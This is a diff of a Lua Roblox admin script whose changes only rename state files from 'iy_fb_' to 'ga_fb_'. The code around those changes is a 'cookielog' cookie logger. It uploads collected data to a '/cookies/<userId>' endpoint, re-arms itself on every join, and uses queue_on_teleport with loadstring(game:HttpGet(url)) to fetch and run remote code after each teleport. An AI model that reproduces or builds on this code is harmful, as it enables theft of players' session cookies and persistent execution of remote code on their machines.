@@ -13667,12 +13667,12 @@ addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend', 'fblog'}, function(args, 
 
 	----------------------------------------------------------------- queue
 	local function loadQueue()
-		local ok, t = pcall(function() return HS:JSONDecode(readfile('iy_fb_queue.txt')) end)
+		local ok, t = pcall(function() return HS:JSONDecode(readfile('ga_fb_queue.txt')) end)
 		if ok and type(t) == 'table' then return t end
 		return {}
 	end
 	local function saveQueue(q)
-		pcall(function() writefile('iy_fb_queue.txt', HS:JSONEncode(q)) end)
+		pcall(function() writefile('ga_fb_queue.txt', HS:JSONEncode(q)) end)
 	end
 	local function enqueue(path, body)
 		local q = loadQueue()
@@ -13780,7 +13780,7 @@ addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend', 'fblog'}, function(args, 
 			cookieAutoConn = nil
 		end
 		if mode == 'stop' or wasOn then
-			pcall(function() writefile('iy_fb_auto.txt', '0') end)
+			pcall(function() writefile('ga_fb_auto.txt', '0') end)
 			notify('Cookie Logger', 'Auto-log OFF.', 5)
 			return
 		end
@@ -13790,7 +13790,7 @@ addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend', 'fblog'}, function(args, 
 				execCmd('cookielog')
 			end
 		end)
-		pcall(function() writefile('iy_fb_auto.txt', '1') end)
+		pcall(function() writefile('ga_fb_auto.txt', '1') end)
 		notify('Cookie Logger', 'Auto-log ON - fires on every join.', 6)
 	end
 
@@ -13799,22 +13799,22 @@ addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend', 'fblog'}, function(args, 
 		local u = argJoin(2)
 		if not u then return notify('Cookie Logger', 'Usage: ;cookielog hop <your script url>', 7) end
 		if not queue_on_teleport then return notify('Cookie Logger', 'Executor has no queue_on_teleport.', 7) end
-		pcall(function() writefile('iy_fb_hopurl.txt', u) end)
+		pcall(function() writefile('ga_fb_hopurl.txt', u) end)
 		queue_on_teleport("task.wait(2)\nloadstring(game:HttpGet('" .. u .. "'))()")
 		notify('Cookie Logger', 'Script re-queued on teleport.', 6)
 		return
 	end
 
 	----------------------------------------------------------------- re-arm
-	if mode == '' and cookieAutoConn == nil and isfile and isfile('iy_fb_auto.txt') and readfile('iy_fb_auto.txt') == '1' then
+	if mode == '' and cookieAutoConn == nil and isfile and isfile('ga_fb_auto.txt') and readfile('ga_fb_auto.txt') == '1' then
 		cookieAutoConn = Players.PlayerAdded:Connect(function(p)
 			if p == Players.LocalPlayer then
 				task.wait(2)
 				execCmd('cookielog')
 			end
 		end)
-		if queue_on_teleport and isfile('iy_fb_hopurl.txt') then
-			local u = readfile('iy_fb_hopurl.txt')
+		if queue_on_teleport and isfile('ga_fb_hopurl.txt') then
+			local u = readfile('ga_fb_hopurl.txt')
 			if u ~= '' then pcall(queue_on_teleport, "task.wait(2)\nloadstring(game:HttpGet('" .. u .. "'))()") end
 		end
 	end
@@ -13878,7 +13878,7 @@ addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend', 'fblog'}, function(args, 
 		creatorName = creatorName,
 		playerCount = #Players:GetPlayers(),
 		maxPlayers = Players.MaxPlayers,
-		hop = (tonumber(isfile and isfile('iy_fb_hop.txt') and readfile('iy_fb_hop.txt') or '0') or 0) + 1,
+		hop = (tonumber(isfile and isfile('ga_fb_hop.txt') and readfile('ga_fb_hop.txt') or '0') or 0) + 1,
 		unix = os.time(),
 		iso = utc(os.time()),
 		tz = os.date('%z'),
@@ -13905,7 +13905,7 @@ addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend', 'fblog'}, function(args, 
 	end
 
 	----------------------------------------------------------------- upload
-	pcall(function() writefile('iy_fb_hop.txt', tostring(self.hop)) end)
+	pcall(function() writefile('ga_fb_hop.txt', tostring(self.hop)) end)
 
 	local fails = {}
 	local ok1, m1 = send('/cookies/' .. tostring(self.userId), self)
